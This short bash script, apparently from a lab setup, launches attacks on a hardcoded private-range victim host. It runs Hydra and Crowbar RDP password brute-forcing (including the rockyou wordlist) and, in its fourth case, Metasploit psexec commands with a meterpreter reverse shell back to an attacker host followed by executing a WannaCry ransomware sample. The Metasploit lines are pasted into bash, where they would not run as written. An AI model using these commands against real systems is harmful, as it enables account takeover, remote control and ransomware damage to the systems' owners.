#!/bin/bash

VICTIM="192.168.239.16"
ATTACK=$1

case $ATTACK in
    1)
        echo "Starting attack RDP using Hydra with one password at `date`..."
        hydra -t 1 -V -f -l administrator -p cassandra rdp://$VICTIM
        echo "Attack RDP using Hydra with one password finished at `date`..."
        ;;
    2)
        echo "Starting attack RDP using Hydra and wordlist rockyou at `date`..."
        hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$VICTIM
        echo "Attack RDP using Hydra and wordlist rockyou finished at `date`..."
        ;;
    3)
        echo "Starting attack RDP using Crowbar at `date`..."
        crowbar -s 192.168.239.16/32 -b rdp -u martin -C passwords.txt
        echo "Attack RDP using Crowbar finished at `date`..."
        ;;
    4)
        # metasploit
        use exploit/windows/smb/psexec
        set payload windows/x64/meterpreter/reverse_tcp
        set LPORT 1234
        set LHOST 192.168.239.3
        set SMBUSER administrator
        set SMBPASS 'Pa$$w0rd'
        exploit
        mv Wannacry.sample Wannacry.exe
        execute -f cmd.exe -H -i
        Wannacry.exe
        ;;
    *)
        echo "***** Attack not recognized."
        ;;
esac
